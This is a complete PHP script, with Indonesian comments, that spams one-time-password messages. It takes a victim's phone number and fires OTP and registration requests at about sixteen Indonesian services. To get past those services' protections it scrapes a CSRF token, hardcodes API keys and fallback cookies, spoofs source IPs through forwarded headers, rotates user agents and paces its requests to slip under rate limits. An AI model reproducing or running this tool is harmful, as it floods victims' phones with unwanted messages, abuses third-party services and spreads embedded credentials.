<?php
error_reporting(0);
ini_set('display_errors', '0');
/*
// Deskripsi: Spam OTP ke berbagai platform
// Contoh: {"number": "6283124609929"}
*/

// Creator: Tiyanz
header('Content-Type: application/json');

// Konfigurasi
$CONFIG = [
    'concurrent' => 1,
    'retries' => 2,
    'timeout' => 45000,
    'delayMin' => 3000,
    'delayMax' => 5000
];

// User Agents
$USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) Safari/604.1',
    'Mozilla/5.0 (Linux; Android 14; SM-S921B) Chrome/120.0.0.0 Mobile Safari/537.36'
];

// Fungsi helper
function randomIP() {
    return rand(1,255) . '.' . rand(1,255) . '.' . rand(1,255) . '.' . rand(1,255);
}

function randomUA() {
    global $USER_AGENTS;
    return $USER_AGENTS[array_rand($USER_AGENTS)];
}

function randomInt($min, $max) {
    return rand($min, $max);
}

function randomUUID() {
    return sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000,
        mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff)
    );
}

function generateEmail() {
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    $result = '';
    for ($i = 0; $i < 10; $i++) {
        $result .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $result . '@bwmyga.com';
}

function normalizePhone($phone) {
    $p = preg_replace('/[^0-9]/', '', $phone);
    if (substr($p, 0, 1) === "0") $p = "62" . substr($p, 1);
    if (substr($p, 0, 2) !== "62") $p = "62" . $p;
    return $p;
}

// Fungsi untuk mengambil CSRF Pinhome
function getPinhomeCSRF() {
    global $USER_AGENTS;
    
    $ch = curl_init('https://www.pinhome.id/daftar');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, $USER_AGENTS[array_rand($USER_AGENTS)]);
    curl_setopt($ch, CURLOPT_HEADER, true);
    
    $response = curl_exec($ch);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headers = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    curl_close($ch);
    
    $csrfToken = '';
    $cookieString = '';
    
    // Parse cookies dari header
    preg_match_all('/Set-Cookie:\s*([^;]+)/i', $headers, $matches);
    if (!empty($matches[1])) {
        $cookieString = implode('; ', $matches[1]);
        foreach ($matches[1] as $cookie) {
            if (strpos($cookie, '_X7kCsrf') !== false) {
                $parts = explode('=', $cookie);
                if (isset($parts[1])) $csrfToken = $parts[1];
            }
        }
    }
    
    // Cari CSRF di HTML
    if (!$csrfToken) {
        if (preg_match('/"csrfToken":"([^"]+)"/', $body, $match)) {
            $csrfToken = $match[1];
        } elseif (preg_match('/name="csrf-token" content="([^"]+)"/', $body, $match)) {
            $csrfToken = $match[1];
        }
    }
    
    // Fallback
    if (!$csrfToken) {
        $csrfToken = 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8';
        $cookieString = '_X7kCsrf=' . $csrfToken . '; _ga=GA1.1.1752313616.1783394371; _fbp=fb.1.1783394372483.552359809276689952; _clck=dub9tf%5E2%5Eg7j%5E0%5E2379';
    }
    
    return [
        'csrfToken' => $csrfToken,
        'cookieString' => $cookieString
    ];
}

// Fungsi untuk mendapatkan endpoint OTP
function getOTPEndpoints($phone) {
    $p08 = "0" . substr($phone, 2);
    $p62 = $phone;
    $pNoCountry = str_replace("62", "", $phone);
    $deviceId = randomUUID();
    $requestId = randomUUID();
    $email = generateEmail();
    
    $csrfData = getPinhomeCSRF();
    
    return [
        ["url" => "https://api.maulagi.id/api/v2/auth/check", "data" => ["credentials" => $p62], "headers" => ["X-ML-KEY" => "B10JLPEP10"]],
        ["url" => "https://matahari-backend-prod.matahari.com/api/auth/re-activation", "data" => ["mobileCountryCode" => "", "mobileNumber" => $p08, "activationCode" => ""]],
        [
            "url" => "https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp",
            "data" => [
                "accountType" => "customers",
                "applicationType" => "Pinhome Web",
                "countryCode" => "62",
                "medium" => "whatsapp",
                "otpType" => "register",
                "phoneNumber" => $pNoCountry
            ],
            "headers" => [
                "x-csrf-token" => $csrfData['csrfToken'],
                "Cookie" => $csrfData['cookieString'],
                "Origin" => "https://www.pinhome.id",
                "Referer" => "https://www.pinhome.id/daftar",
                "Content-Type" => "text/plain;charset=UTF-8"
            ]
        ],
        ["url" => "https://www.bonusbelanja.com/api/auth/registration/app", "data" => ["phone" => $p62, "name" => "User", "agreeTnc" => true, "agreeContact" => false]],
        ["url" => "https://www.alodokter.com/resend-otp", "data" => ["user" => ["phone" => $p08, "uuid" => randomUUID()], "request_via" => "whatsapp"]],
        ["url" => "https://www.beautyhaul.com/ajax/account/send_otp", "data" => ["method" => "WhatsApp", "phone" => $p62]],
        ["url" => "https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id", "data" => ["nama_lengkap" => "User", "telepon" => $p08, "email" => "user" . rand(1000,9999) . "@mail.com"], "headers" => ["Xid" => rand(1000000, 9999999), "source" => "ocistok"]],
        ["url" => "https://api.duniagames.co.id/api/other/api/v1/content/", "data" => null, "method" => "GET", "headers" => ["Accept-Language" => "id", "x-device" => $deviceId, "Ciam-Type" => "FR"]],
        ["url" => "https://internetrakyat.id/api/app/auth/send-otp-register", "data" => ["phone_number" => $p08], "headers" => ["x-api-key" => "280999!FTTH", "Origin" => "https://internetrakyat.id", "Referer" => "https://internetrakyat.id/auth/register"]],
        ["url" => "https://api.dokterin.id/user/v1/users/login", "data" => ["phone" => $p62, "tnc_accept" => true, "device_id" => randomUUID()], "headers" => ["Origin" => "https://dokterin.id", "Referer" => "https://dokterin.id/login"]],
        ["url" => "https://api.paper.id/api/v1/auth/login", "data" => ["method" => "whatsapp", "phone" => $p08], "headers" => ["Origin" => "https://www.paper.id", "Referer" => "https://www.paper.id/", "x-paper-user-agent" => "Jupiter/7.19.5 desktop (windows) Firefox 152", "request-id" => $requestId]],
        ["url" => "https://api.indodax.com/api/v1/otp/send", "data" => ["email" => $email, "flow" => "register", "method" => "whatsapp", "old_uuid" => ""], "headers" => ["Origin" => "https://indodax.com", "Referer" => "https://indodax.com/", "key" => "bAGUG2WiLy", "authorization" => "Bearer bAGUG2WiLy"]],
        ["url" => "https://cms.bunda.co.id/api/v1/auth/send-otp", "data" => ["phone_number" => $p62, "type" => "auth"], "headers" => ["Origin" => "https://www.bunda.co.id", "Referer" => "https://www.bunda.co.id/id", "X-Requested-With" => "XMLHttpRequest", "X-Locale" => "id"]],
        ["url" => "https://api.fastwork.id/auth/v2/signup.sendVerificationCode", "data" => ["phone_number" => $p08]],
        ["url" => "https://saturdays.com/api/v1/auth/otp", "data" => ["phone" => $p62, "type" => "register"]],
        ["url" => "https://api.saturdays.com/v2/user/otp/request", "data" => ["phoneNumber" => $p62, "channel" => "whatsapp"]]
    ];
}

// Fungsi kirim request
function sendRequest($endpoint, $idx) {
    global $USER_AGENTS, $CONFIG;
    
    $headers = [
        "Content-Type: application/json",
        "User-Agent: " . $USER_AGENTS[array_rand($USER_AGENTS)],
        "X-Forwarded-For: " . randomIP(),
        "X-Real-IP: " . randomIP(),
        "Accept: application/json, text/plain, */*",
        "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8",
        "Connection: keep-alive"
    ];
    
    // Tambahkan custom headers
    if (isset($endpoint['headers'])) {
        foreach ($endpoint['headers'] as $key => $value) {
            if ($key === "Cookie") {
                $headers[] = "Cookie: " . $value;
            } else {
                $headers[] = $key . ": " . $value;
            }
        }
    }
    
    // Delay untuk fastwork
    if (strpos($endpoint['url'], 'fastwork.id') !== false) {
        usleep(rand(30000000, 45000000));
    } else {
        usleep(rand(3000000, 5000000));
    }
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $endpoint['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, $CONFIG['timeout']/1000);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    // Method dan data
    if (isset($endpoint['method']) && $endpoint['method'] === "GET") {
        curl_setopt($ch, CURLOPT_HTTPGET, true);
    } else if ($endpoint['data'] !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($endpoint['data']));
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    curl_close($ch);
    
    if ($response === false) {
        return false;
    }
    
    $responseData = json_decode($response, true);
    
    // Cek sukses berdasarkan status
    if (in_array($httpCode, [200, 201, 202, 204])) {
        return true;
    }
    
    // Cek berdasarkan response body
    if ($responseData) {
        if (isset($responseData['success']) && $responseData['success'] === true) return true;
        if (isset($responseData['status']) && $responseData['status'] === "success") return true;
        if (isset($responseData['statusCode']) && $responseData['statusCode'] === 200) return true;
        if (isset($responseData['status']) && $responseData['status'] === 202) return true;
        if (isset($responseData['is_success']) && $responseData['is_success'] === true) return true;
        if (isset($responseData['message']) && in_array($responseData['message'], ["OTP terkirim", "OTP sent successfully", "Success."])) return true;
        if (isset($responseData['secretCode'])) return true;
        if (isset($responseData['data'])) {
            if (isset($responseData['data']['otp']) && $responseData['data']['otp'] === "processed") return true;
            if (isset($responseData['data']['new_uuid'])) return true;
            if (isset($responseData['data']['status']) && $responseData['data']['status'] === 1) return true;
        }
    }
    
    return false;
}

// Fungsi utama
function sendOTP($phoneNumber) {
    $phone = normalizePhone($phoneNumber);
    $endpoints = getOTPEndpoints($phone);
    $results = [];
    $start = microtime(true);
    
    for ($i = 0; $i < count($endpoints); $i++) {
        $result = sendRequest($endpoints[$i], $i + 1);
        $results[] = $result;
        if ($i < count($endpoints) - 1) {
            usleep(rand(3000000, 5000000));
        }
    }
    
    $elapsed = round(microtime(true) - $start, 1);
    $success = count(array_filter($results, function($r) { return $r === true; }));
    $failed = count(array_filter($results, function($r) { return $r === false; }));
    
    return [
        'phone' => $phone,
        'total' => count($endpoints),
        'success' => $success,
        'failed' => $failed,
        'elapsed' => $elapsed . 's',
        'results' => $results
    ];
}

// Main execution
$number = isset($_GET['number']) ? $_GET['number'] : '';

if (empty($number)) {
    echo json_encode([
        "success" => false,
        "message" => "Parameter 'number' wajib diisi",
        "example" => "spam.php?number=08123456789"
    ], JSON_PRETTY_PRINT);
    exit;
}

// Validasi nomor HP
if (!preg_match('/^[0-9]{10,13}$/', $number)) {
    echo json_encode([
        "success" => false,
        "message" => "Format nomor tidak valid. Gunakan 10-13 digit angka"
    ], JSON_PRETTY_PRINT);
    exit;
}

// Eksekusi spam
$result = sendOTP($number);

echo json_encode([
    "success" => true,
    "data" => $result
], JSON_PRETTY_PRINT);
?>
